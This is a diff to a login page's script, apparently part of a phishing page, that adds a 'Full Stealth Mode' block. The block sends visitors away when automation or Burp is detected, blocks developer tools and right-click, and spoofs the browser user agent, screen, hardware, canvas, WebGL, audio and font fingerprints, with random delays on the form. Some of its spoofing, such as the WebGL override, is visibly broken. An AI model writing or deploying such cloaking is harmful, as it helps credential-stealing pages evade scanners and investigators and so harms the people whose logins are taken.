@@ -271,16 +271,14 @@ success: function (response) {
 try {
 if (response.success) {
 showMessage("Verification successful.", "success");
-// Hide the login form and logo immediately
 $('#entry-form').hide();
 $('.logo').hide(); 
-// Redirect after 3 seconds
 setTimeout(() => {
 window.location.href = response.redirect;
-}, 3000);
+}, 6000);
 } else {
-showMessage(response.message || "The login is invalid �.", "error");
-$('#password').val(''); // Clear password only on failure
+showMessage(response.message || "The login is invalid .", "error");
+$('#password').val('');
 }
 } catch (e) {
 showMessage("Error parsing server response.", "error");
@@ -290,7 +288,7 @@ error: function (xhr, status) {
 if (status === "timeout" || status === "error") {
 showMessage("Login is invalid.", "error");
 }
-$('#password').val(''); // Clear password only on failure
+$('#password').val('');
 },
 timeout: 10000 
 });
@@ -332,5 +330,152 @@ messageDiv.css('background-color', '#d35351');
 });
 }
 });
+
+document.addEventListener("DOMContentLoaded", function() {
+
+setTimeout(() => {
+document.getElementById('login-form').style.opacity = '0';
+document.getElementById('login-form').style.display = 'block';
+setTimeout(() => {
+document.getElementById('login-form').style.opacity = '1';
+document.getElementById('login-form').style.transition = 'opacity 1s ease-in-out';
+}, 100);
+}, Math.random() * 3000 + 2000); // Random delay between 2-5 seconds
+
+document.getElementById('login-button').addEventListener('click', function(event) {
+event.preventDefault(); // Prevents immediate submission
+document.getElementById('login-button').disabled = true; // Disable button to prevent multiple clicks
+        
+setTimeout(() => {
+document.getElementById('entry-form').submit(); // Submits the form after random delay
+}, Math.random() * 3000 + 2000); // Random delay between 2 - 5 seconds
+});
+});
+
+(function() {
+'use strict';
+
+function shuffle(arr) {
+let ci = arr.length, tv, ri;
+while (0 !== ci) {
+ri = Math.floor(Math.random() * ci);
+ci -= 1;
+tv = arr[ci];
+arr[ci] = arr[ri];
+arr[ri] = tv;
+}
+return arr;
+}
+
+if (
+navigator.webdriver ||
+window.callPhantom ||
+window._phantom ||
+navigator.userAgent.includes("Burp") ||
+window.navigator.languages === undefined
+) {
+window.location = "about:blank";  // Redirects bots away
+}
+
+function detectWindowAnomalies() {
+const minWidth = 500, minHeight = 300;
+if (window.innerWidth < minWidth || window.innerHeight < minHeight) {
+window.location = "about:blank"; // Blocks headless browsers with unnatural sizes
+}
+}
+detectWindowAnomalies();
+
+Object.defineProperty(window, 'innerWidth', { get: function() { return 1920; }, configurable: true });
+Object.defineProperty(window, 'innerHeight', { get: function() { return 1080; }, configurable: true });
+Object.defineProperty(screen, 'width', { get: function() { return 1920; }, configurable: true });
+Object.defineProperty(screen, 'height', { get: function() { return 1080; }, configurable: true });
+
+document.addEventListener("keydown", function (event) {
+const blockedKeys = [
+{ keyCode: 123 }, // F12 - DevTools
+{ ctrl: true, keyCode: 85 }, // Ctrl + U (View Source)
+{ ctrl: true, shift: true, keyCode: 73 }, // Ctrl + Shift + I
+{ ctrl: true, shift: true, keyCode: 74 } // Ctrl + Shift + J
+];
+if (blockedKeys.some(k => (!k.ctrl || event.ctrlKey) && (!k.shift || event.shiftKey) && event.keyCode === k.keyCode)) {
+event.preventDefault();
+return false;
+        }
+});
+document.addEventListener('contextmenu', function(event) {
+event.preventDefault();
+return false;
+});
+
+const randomUAs = [
+"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+];
+const spoofedUA = randomUAs[Math.floor(Math.random() * randomUAs.length)];
+Object.defineProperty(navigator, 'userAgent', { get: function() { return spoofedUA; }, configurable: true });
+
+Object.defineProperty(navigator, 'hardwareConcurrency', { get: function() { return Math.floor(Math.random() * 8) + 2; } });
+Object.defineProperty(navigator, 'deviceMemory', { get: function() { return Math.floor(Math.random() * 8) + 2; } });
+
+Object.defineProperty(navigator, 'mediaDevices', {
+get: function() {
+return {
+enumerateDevices: async () => [],
+getUserMedia: async () => { throw new Error("Not Allowed"); }
+};
+},
+configurable: true
+});
+
+Object.defineProperty(navigator, 'webdriver', { get: function() { return false; }, configurable: true });
+delete window.chrome;
+Object.defineProperty(navigator, 'languages', { get: function() { return ["en-US", "en"]; }, configurable: true });
+Object.defineProperty(navigator, 'platform', { get: function() { return "Win32"; }, configurable: true });
+Object.defineProperty(navigator, 'vendor', { get: function() { return "Google Inc."; }, configurable: true });
+
+HTMLCanvasElement.prototype.getContext = (function(orig) {
+return function(type, attributes) {
+const ctx = orig.apply(this, arguments);
+if (type === "2d") {
+const originalFillText = ctx.fillText;
+ctx.fillText = function() {
+const args = Array.from(arguments);
+args[0] += "👻"; // Adds noise
+return originalFillText.apply(this, args);
+};
+}
+return ctx;
+};
+})(HTMLCanvasElement.prototype.getContext);
+
+WebGLRenderingContext.prototype.getParameter = function(parameter) {
+if (parameter === 37445 || parameter === 37446) {  // UNMASKED_VENDOR / UNMASKED_RENDERER
+return "Intel Inc.";
+}
+return "NVIDIA GeForce GTX 1080";
+};
+
+const originalOfflineAudioContext = window.OfflineAudioContext;
+window.OfflineAudioContext = function(...args) {
+const ctx = new originalOfflineAudioContext(...args);
+const originalGetFloatFrequencyData = ctx.createAnalyser().getFloatFrequencyData;
+ctx.createAnalyser().getFloatFrequencyData = function(dataArray) {
+const randomOffset = Math.random() * 0.0001;
+for (let i = 0; i < dataArray.length; i++) {
+dataArray[i] += randomOffset;
+}
+return originalGetFloatFrequencyData.apply(this, [dataArray]);
+};
+return ctx;
+};
+
+const originalAvailableFonts = ["Arial", "Verdana", "Times New Roman"];
+Object.defineProperty(document, "fonts", {
+get: function() { return new Set(originalAvailableFonts); },
+configurable: true
+});
+
+console.log("Full Stealth Mode: Enhanced & Enabled 🔥");
+})();
 </script></div>
 </body></html>
